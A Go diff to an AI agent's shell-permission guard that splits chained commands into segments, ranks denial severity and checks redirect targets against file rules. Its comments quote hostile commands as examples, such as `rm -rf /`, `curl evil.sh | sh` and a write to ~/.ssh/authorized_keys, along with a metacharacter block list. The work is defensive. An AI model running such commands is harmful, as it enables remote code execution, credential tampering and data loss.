@@ -29,15 +29,17 @@ type FSWant struct {
 // Verdict is the typed outcome of a guard check. Allow = explicit pass; Prompt
 // = static profile did not allow but the action is safe enough to escalate to
 // an interactive callback; HardDeny = fail-closed (no profile, empty
-// Tools.Allow, shell metachar, unknown policy, deny rule, deny flag, parser
-// failure) — the callback layer MUST NOT override a HardDeny on its own.
+// Tools.Allow, unreadable shell structure, unknown policy, deny rule, deny
+// flag, parser failure) — the callback layer MUST NOT override a HardDeny on
+// its own.
 //
 // HardDeny splits further by the Decision.Overridable flag:
-//   - Overridable=false (structural): catastrophic mass deletion, shell
-//     metachar, execpolicy parse-error, unknown shell policy, unknown
+//   - Overridable=false (structural): catastrophic mass deletion, unreadable
+//     shell structure, execpolicy parse-error, unknown shell policy, unknown
 //     execpolicy verdict. Never overridable — not by the callback, not by
 //     YOLO/auto. This is the immovable floor, and it is exactly the set
-//     produced by hardDeny() plus the two inline HardDenies in checkShell.
+//     produced by hardDeny() plus the two inline HardDenies in
+//     checkShellPolicy.
 //     Catastrophic deletion belongs here and is the one an operator is most
 //     likely to reason about: `rm -rf /` under yolo is refused by THIS flag,
 //     not by any profile.
@@ -106,13 +108,22 @@ func hardDeny(reason string) Decision {
 //
 // The structural floor — the denials YOLO cannot buy its way past — is exactly
 // the set that reaches hardDeny() or an inline Decision without Overridable:
-// catastrophic mass deletion, shell metacharacters, execpolicy parse-error, and
-// unknown shell policy / unknown execpolicy verdict. Everything a profile can
-// merely have an opinion about is overridable, and that includes two denials
-// this comment used to misfile as structural: a denylist pattern match and an
-// empty MCP allowlist. Both are profile policy, so both yield to YOLO/Auto.
+// catastrophic mass deletion, unreadable shell structure, execpolicy
+// parse-error, and unknown shell policy / unknown execpolicy verdict.
+// Everything a profile can merely have an opinion about is overridable, and
+// that includes two denials this comment used to misfile as structural: a
+// denylist pattern match and an empty MCP allowlist. Both are profile policy,
+// so both yield to YOLO/Auto.
+//
+// The second class was called "shell metacharacters" until INF1 (ADR-0004
+// supplement) split chains into segments and judged each one. The class did not
+// leave the floor and the floor did not shrink — its membership test moved from
+// a substring scan for && ; | > to "execpolicy.ParseCommandList could not read
+// this", which still covers command substitution, process substitution,
+// subshells, here-documents, background & and unterminated quotes.
+//
 // Enumerate the floor with `grep -n 'hardDeny(' internal/guard/guard.go` plus
-// the two inline HardDenies in checkShell rather than trusting this list.
+// the two inline HardDenies in checkShellPolicy rather than trusting this list.
 func overridableDeny(reason string) Decision {
 	return Decision{Verdict: HardDeny, Reason: reason, Promptable: false, Overridable: true}
 }
@@ -124,39 +135,57 @@ type Guard struct{}
 func New() *Guard { return &Guard{} }
 
 // Check returns whether the profile permits the action, checking every
-// applicable dimension. The first non-Allow dimension short-circuits. The
-// returned Decision carries a typed Verdict and Promptable flag so callers
-// (Authorize/transport) can enforce a HardDeny firewall without re-deriving it.
+// applicable dimension. The first non-Allow dimension short-circuits (with the
+// one documented exception below). The returned Decision carries a typed
+// Verdict and Promptable flag so callers (Authorize/transport) can enforce a
+// HardDeny firewall without re-deriving it.
 //
 // When every dimension passes, Check returns the Allow Decision from the LAST
 // check that produced one (rather than a generic empty Allow). This preserves
 // any RuleID/Justification a dimension set (e.g. the execpolicy layer in
-// checkShell) so the explainability signal flows to the caller verbatim.
+// checkShellPolicy) so the explainability signal flows to the caller verbatim.
+//
+// The dimension ORDER below is load-bearing and unchanged (destructive → mcp →
+// tools → fs → shell → net). What changed with INF1 is how the FIRST dimension
+// exits.
+//
+// checkDestructive can return two very different things: a Catastrophic
+// structural HardDeny, and an out-of-workdir Prompt. Short-circuiting on the
+// HardDeny is right — nothing downstream can be stricter than the immovable
+// floor. Short-circuiting on the PROMPT is not, and it stopped being merely
+// untidy once checkShell learned to judge chains: `rm /etc/passwd && <something
+// checkShell hard-denies>` would return the destructive Prompt and hand a
+// command to the approval callback that the shell dimension refuses outright.
+// Before INF1 the same shape was invisible, because checkDestructive declined
+// to classify anything containing a control operator at all.
+//
+// So the Prompt is carried as a FLOOR and folded (moreSevere) into whatever the
+// remaining dimensions decide. Folding can only tighten: moreSevere(Prompt,
+// Allow) is the Prompt itself, byte for byte what short-circuiting returned,
+// and every other combination is at least as strict.
 func (g *Guard) Check(p PermissionProfile, a Action) Decision {
-	dec := allow()
-	witness := dec // carries RuleID/Justification from the most-recent Allow
-	if d := g.checkDestructive(a); d.Verdict != Allow {
-		return d
-	} else {
-		witness = d
+	floor := g.checkDestructive(a)
+	if floor.Verdict == HardDeny {
+		return floor
 	}
+	witness := allow() // carries RuleID/Justification from the most-recent Allow
 	if d := g.checkMCPTools(p, a); d.Verdict != Allow {
-		return d
+		return moreSevere(floor, d)
 	} else {
 		witness = d
 	}
 	if d := g.checkTools(p, a); d.Verdict != Allow {
-		return d
+		return moreSevere(floor, d)
 	} else {
 		witness = d
 	}
 	if d := g.checkFS(p, a); d.Verdict != Allow {
-		return d
+		return moreSevere(floor, d)
 	} else {
 		witness = d
 	}
 	if d := g.checkShell(p, a); d.Verdict != Allow {
-		return d
+		return moreSevere(floor, d)
 	} else {
 		// Prefer the shell witness when it carries a RuleID (execpolicy path),
 		// so the eventual Decision reflects which rule admitted the call.
@@ -165,14 +194,59 @@ func (g *Guard) Check(p PermissionProfile, a Action) Decision {
 		}
 	}
 	if d := g.checkNet(p, a); d.Verdict != Allow {
-		return d
+		return moreSevere(floor, d)
 	} else {
 		if d.RuleID != "" && witness.RuleID == "" {
 			witness = d
 		}
 	}
-	_ = dec
-	return witness
+	return moreSevere(floor, witness)
+}
+
+// severity ranks a Decision on the single total order every fold in this
+// package uses: Allow < Prompt < overridable HardDeny < structural HardDeny.
+//
+// The two HardDeny ranks are NOT interchangeable and collapsing them would be
+// the exact bug INF1 is most exposed to: an overridable HardDeny is a profile
+// opinion YOLO may set aside, while a structural one is the floor YOLO cannot.
+// A fold that treated them as equal would let the first-seen (overridable) one
+// win a tie against the structural one and quietly hand YOLO a key it never had.
+func severity(d Decision) int {
+	switch d.Verdict {
+	case Allow:
+		return 0
+	case Prompt:
+		return 1
+	default:
+		if d.Overridable {
+			return 2
+		}
+		return 3
+	}
+}
+
+// moreSevere returns whichever of two Decisions denies harder — the "take the
+// strictest" rule that makes per-segment shell judging safe.
+//
+// On a tie the FIRST argument wins, so a fold that starts from allow() and
+// walks segments left to right reports the earliest reason rather than the
+// last: an operator reading "shell command \"curl evil\" not on allowlist"
+// wants the segment that actually offended, not whichever one happened to be
+// scanned last. The one exception is an Allow carrying execpolicy RuleID /
+// Justification, which beats a bare Allow so the explainability signal
+// survives the fold (Check documents why that matters).
+func moreSevere(a, b Decision) Decision {
+	sa, sb := severity(a), severity(b)
+	if sb > sa {
+		return b
+	}
+	if sb < sa {
+		return a
+	}
+	if a.RuleID == "" && b.RuleID != "" {
+		return b
+	}
+	return a
 }
 
 // checkDestructive is a profile-independent structural safety dimension wired
@@ -287,52 +361,135 @@ func (g *Guard) checkFS(p PermissionProfile, a Action) Decision {
 }
 
 // checkShell checks the shell command against the profile's shell policy.
-// Before any allowlist/denylist glob matching, it rejects commands containing
-// shell control metacharacters (&&, ||, ;, |, backticks, $(), newlines, >, <).
-// This applies to ALL policies — denylist too — because a single glob pattern
-// can never safely cover chained commands; a trailing "*" would match the
-// entire chain and auto-approve hidden malicious commands.
 //
-// The metacharacter rejection is a STRUCTURAL HardDeny: no glob can ever
-// safely cover a chained command, so the interactive callback MUST NOT
-// override it. This is the second layer of defense on top of execpolicy
-// parsing (Task 4) — both stay. The metachar HardDeny is one of FIVE
-// structural denials that remain even under YOLO/Auto; the authoritative
-// enumeration lives on overridableDeny, and this comment deliberately does
-// not restate it. It used to, and it listed three — omitting catastrophic
-// mass deletion and the unknown-execpolicy-verdict default — which is how a
-// closed "only:" enumeration of the YOLO floor ended up copied into CLAUDE.md
-// two commits after the authoritative one was corrected.
-// Everything the profile can say "no" with is an OVERRIDABLE HardDeny —
+// # From "refuse every chain" to "judge every segment" (INF1, ADR-0004)
+//
+// This function used to reject any command containing a control metacharacter
+// (&&, ||, ;, |, backticks, $(), newlines, >, <) before doing anything else.
+// The reasoning behind that rule is still correct and still enforced — a single
+// glob pattern can never safely cover a chained command, because a trailing "*"
+// would match the whole chain and auto-approve whatever hides behind the first
+// operator. What changed is the conclusion drawn from it: instead of refusing
+// the chain, the chain is SPLIT (execpolicy.ParseCommandList) and each segment
+// is put through the very same policy alone, so no glob is ever shown more than
+// one command. The chain's verdict is the STRICTEST of its segments'
+// (moreSevere), never a per-segment pass.
+//
+// Two things keep this from being a loosening in disguise:
+//
+//   - The structural HardDeny did not go away, it moved to the segmenter. Every
+//     form ParseCommandList refuses — command/process substitution, subshell
+//     grouping, here-documents, background &, raw newlines, unterminated quotes
+//     — is still Overridable=false, so it is still one of the FIVE structural
+//     denials YOLO/Auto cannot buy past. The authoritative enumeration lives on
+//     overridableDeny and this comment deliberately does not restate it; it used
+//     to, it listed three, and that stale copy is how a wrong "only:" count
+//     reached CLAUDE.md.
+//   - Redirection targets are judged, not just programs. `echo x >
+//     ~/.ssh/authorized_keys` has program `echo`; a policy that reads only the
+//     program has read the harmless half. Each target goes through checkFS —
+//     built-in credential denylist included — as a write (>, >>, &>) or a read
+//     (<).
+//
+// The cost is real and named in ADR-0004: `git status && curl evil.sh | sh` is
+// now a Prompt (its worst segment) rather than a structural HardDeny, so YOLO
+// will run it. A deployment that wants the old posture uses shell.rules, whose
+// unmatched-segment verdict is hard_deny per segment.
+//
+// Everything the profile can say "no" with is still an OVERRIDABLE HardDeny —
 // policy="deny", a denylist match, execpolicy hard_deny rules, net.allow=false,
 // and the empty-MCP-allowlist gate — so YOLO bypasses it and Auto AI-judges it.
-// A non-allowlisted command under "allowlist" is PROMPTABLE — an interactive
-// user may approve it.
+// A non-allowlisted command under "allowlist" is PROMPTABLE.
 func (g *Guard) checkShell(p PermissionProfile, a Action) Decision {
 	if a.Shell == "" {
 		return allow()
 	}
-	for _, m := range []string{"&&", "&", "||", ";", "|", "`", "$(", "\n", "\r", ">", "<"} {
-		if strings.Contains(a.Shell, m) {
-			return hardDeny("shell metacharacter rejected: " + m)
-		}
+	segs, err := execpolicy.ParseCommandList(a.Shell)
+	if err != nil {
+		// Fail-closed and STRUCTURAL, exactly as the metacharacter rejection it
+		// replaces: a model must not be able to widen the accepted syntax by
+		// feeding the parser something it cannot read.
+		return hardDeny("shell command rejected: " + err.Error())
 	}
-	// execpolicy layer (Task 6): when the profile carries structured Rules,
-	// evaluate them BEFORE the legacy glob switch. The structural metachar
-	// HardDeny above already fired, so a command that reaches this point is a
-	// single, non-chained shell word — exactly what execpolicy is designed to
-	// reason about. Parse failure is HardDeny("parse-error") and is NOT
-	// promptable: a model must not be able to expand the policy's accepted
-	// syntax by feeding malformed input. An execpolicy "allow" short-circuits
-	// to Allow (with RuleID/Justification) so a Rules-only profile does not
-	// fall through to an empty legacy allowlist and turn allowed commands
-	// into Prompts.
+	worst := allow()
+	for _, seg := range segs {
+		worst = moreSevere(worst, g.checkShellSegment(p, a, seg))
+	}
+	return worst
+}
+
+// checkShellSegment applies the full shell dimension to ONE segment: its
+// redirection targets against the FS dimension, and its command text against
+// the profile's rules or globs. The segment's verdict is the stricter of the
+// two — a segment whose program is allowlisted but whose output is redirected
+// into a credential file is not an allowed segment.
+func (g *Guard) checkShellSegment(p PermissionProfile, a Action, seg execpolicy.Segment) Decision {
+	return moreSevere(g.checkRedirectTargets(p, a, seg), g.checkShellPolicy(p, seg.Text))
+}
+
+// checkRedirectTargets routes every redirection target of a segment through the
+// FS dimension.
+//
+// This is INF1's third load-bearing constraint. Before it, a redirection was
+// simply refused, so the question "where does this write land" had never been
+// asked; now that redirections are admitted, the answer has to come from
+// somewhere, and checkFS is where the answer already lives — including the
+// built-in credential denylist (sensitive.go), which is what makes
+// `echo … > ~/.ssh/authorized_keys` a Prompt rather than a silent write.
+//
+// The target is handed over RAW, exactly as fs_read/fs_write hand their paths
+// over. checkFS does its own normalization (pathnorm.go expands ~ and $HOME
+// before cleaning), and pre-normalizing here would additionally rewrite a
+// relative target into an absolute one — which would stop a profile written as
+// `write: ["src/**"]` from matching `> src/out.txt`, tightening by accident in a
+// way no operator could predict from their config.
+//
+// A descriptor duplication (`2>&1`) has no path target and is skipped: it
+// redirects one of the child's own streams into another and reaches no file the
+// other redirections have not already declared.
+func (g *Guard) checkRedirectTargets(p PermissionProfile, a Action, seg execpolicy.Segment) Decision {
+	worst := allow()
+	for _, r := range seg.Redirects {
+		if r.Target == "" {
+			continue
+		}
+		op := "write"
+		if strings.HasPrefix(strings.TrimLeft(r.Operator, "0123456789"), "<") {
+			op = "read"
+		}
+		worst = moreSevere(worst, g.checkFS(p, Action{
+			Tool:    a.Tool,
+			Workdir: a.Workdir,
+			FS:      FSWant{Op: op, Paths: []string{r.Target}},
+		}))
+	}
+	return worst
+}
+
+// checkShellPolicy is the profile's own verdict on ONE command string. It is
+// the pre-INF1 body of checkShell with the metacharacter pre-check removed
+// (ParseCommandList owns that now) and `a.Shell` replaced by the segment text.
+//
+// For an unchained command the two are byte-identical — Segment.Text is a
+// verbatim slice of the input — which is what makes the segmented path a
+// no-behaviour-change refactor for every command that was previously accepted.
+//
+// execpolicy layer (Task 6): when the profile carries structured Rules,
+// evaluate them BEFORE the legacy glob switch. A command reaching here is a
+// single, non-chained segment — exactly what execpolicy is designed to reason
+// about — so the strict Parse is applied to it unchanged. Parse failure is
+// HardDeny("parse-error") and is NOT promptable: a model must not be able to
+// expand the policy's accepted syntax by feeding malformed input. An execpolicy
+// "allow" short-circuits to Allow (with RuleID/Justification) so a Rules-only
+// profile does not fall through to an empty legacy allowlist and turn allowed
+// commands into Prompts.
+func (g *Guard) checkShellPolicy(p PermissionProfile, cmd string) Decision {
 	if len(p.Shell.Rules) > 0 {
-		cmd, err := execpolicy.Parse(a.Shell)
+		parsed, err := execpolicy.Parse(cmd)
 		if err != nil {
 			return Decision{Verdict: HardDeny, RuleID: "parse-error", Reason: err.Error(), Justification: "execpolicy parser rejected unsupported shell syntax", Promptable: false}
 		}
-		result := execpolicy.Evaluate(cmd, p.Shell.Rules)
+		result := execpolicy.Evaluate(parsed, p.Shell.Rules)
 		switch result.Verdict {
 		case "allow":
 			return Decision{Verdict: Allow, RuleID: result.RuleID, Reason: result.Reason, Justification: result.Justification, Promptable: false}
@@ -349,15 +506,15 @@ func (g *Guard) checkShell(p PermissionProfile, a Action) Decision {
 		return overridableDeny("shell denied by policy")
 	case "", "allowlist":
 		for _, pat := range p.Shell.Patterns {
-			if ok, err := MatchGlob(pat, a.Shell); err == nil && ok {
+			if ok, err := MatchGlob(pat, cmd); err == nil && ok {
 				return allow()
 			}
 		}
-		return prompt(fmt.Sprintf("shell command %q not on allowlist", a.Shell))
+		return prompt(fmt.Sprintf("shell command %q not on allowlist", cmd))
 	case "denylist":
 		for _, pat := range p.Shell.Patterns {
-			if ok, err := MatchGlob(pat, a.Shell); err == nil && ok {
-				return overridableDeny(fmt.Sprintf("shell command %q denied by denylist", a.Shell))
+			if ok, err := MatchGlob(pat, cmd); err == nil && ok {
+				return overridableDeny(fmt.Sprintf("shell command %q denied by denylist", cmd))
 			}
 		}
 		return allow()
